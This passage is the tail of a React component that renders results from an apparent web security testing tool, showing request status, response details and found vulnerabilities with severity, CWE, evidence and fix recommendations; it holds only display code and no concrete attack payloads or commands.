                  {testResults.map((result) => (
                    <Card key={result.id} className="border-l-4 border-l-primary">
                      <CardContent className="p-4">
                        <div className="flex items-start justify-between mb-2">
                          <div>
                            <h4 className="font-medium">{result.testName}</h4>
                            <div className="flex items-center gap-2 mt-1">
                              <Badge variant="outline">{result.method}</Badge>
                              <Badge className={getStatusColor(result.status)}>
                                {result.status === "running" && <Clock className="h-3 w-3 mr-1" />}
                                {result.status === "passed" && <CheckCircle className="h-3 w-3 mr-1" />}
                                {(result.status === "failed" || result.status === "error") && (
                                  <AlertTriangle className="h-3 w-3 mr-1" />
                                )}
                                {result.status.charAt(0).toUpperCase() + result.status.slice(1)}
                              </Badge>
                            </div>
                          </div>
                          <div className="text-right text-sm text-muted-foreground">
                            <div>{result.timestamp.toLocaleTimeString()}</div>
                            {result.responseTime > 0 && <div>{result.responseTime}ms</div>}
                          </div>
                        </div>

                        <div className="text-sm text-muted-foreground mb-2">{result.url}</div>

                        {result.statusCode && (
                          <div className="flex items-center gap-2 mb-2">
                            <span className="text-sm">Status:</span>
                            <Badge
                              variant={result.statusCode >= 200 && result.statusCode < 300 ? "default" : "destructive"}
                            >
                              {result.statusCode}
                            </Badge>
                          </div>
                        )}

                        {(result.testedPayloads || 0) > 0 && (
                          <div className="text-xs text-muted-foreground mb-2">
                            Tested {result.testedPayloads} payloads • {result.totalRequests} requests
                          </div>
                        )}

                        {result.vulnerabilities.length > 0 && (
                          <div className="space-y-2 mt-3">
                            <h5 className="font-medium text-sm">Vulnerabilities Found:</h5>
                            {result.vulnerabilities.map((vuln) => (
                              <Card key={vuln.id} className="border-l-4 border-l-destructive">
                                <CardContent className="p-3">
                                  <div className="flex items-start justify-between mb-1">
                                    <div className="flex items-center gap-2">
                                      {getVulnerabilityIcon(vuln.type)}
                                      <span className="font-medium text-sm">{vuln.type.replace("_", " ")}</span>
                                      {vuln.cwe && (
                                        <Badge variant="outline" className="text-xs">
                                          {vuln.cwe}
                                        </Badge>
                                      )}
                                    </div>
                                    <Badge className={getSeverityColor(vuln.severity)}>{vuln.severity}</Badge>
                                  </div>
                                  <p className="text-xs mb-2">{vuln.description}</p>
                                  <div className="bg-muted p-2 rounded text-xs font-mono mb-2">{vuln.evidence}</div>
                                  {vuln.payload && (
                                    <div className="bg-muted p-2 rounded text-xs font-mono mb-2">
                                      <strong>Payload:</strong> {vuln.payload}
                                    </div>
                                  )}
                                  <div className="bg-primary/10 p-2 rounded text-xs">
                                    <strong>Fix:</strong> {vuln.recommendation}
                                  </div>
                                </CardContent>
                              </Card>
                            ))}
                          </div>
                        )}

                        {result.responseBody && result.status !== "running" && (
                          <Tabs defaultValue="response" className="mt-3">
                            <TabsList className="grid w-full grid-cols-2">
                              <TabsTrigger value="response">Response</TabsTrigger>
                              <TabsTrigger value="headers">Headers</TabsTrigger>
                            </TabsList>
                            <TabsContent value="response">
                              <div className="bg-muted p-2 rounded text-xs font-mono max-h-32 overflow-auto">
                                {result.responseBody}
                              </div>
                            </TabsContent>
                            <TabsContent value="headers">
                              <div className="bg-muted p-2 rounded text-xs font-mono max-h-32 overflow-auto">
                                {JSON.stringify(result.responseHeaders, null, 2)}
                              </div>
                            </TabsContent>
                          </Tabs>
                        )}
                      </CardContent>
                    </Card>
                  ))}
                </div>
              </ScrollArea>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  )
}
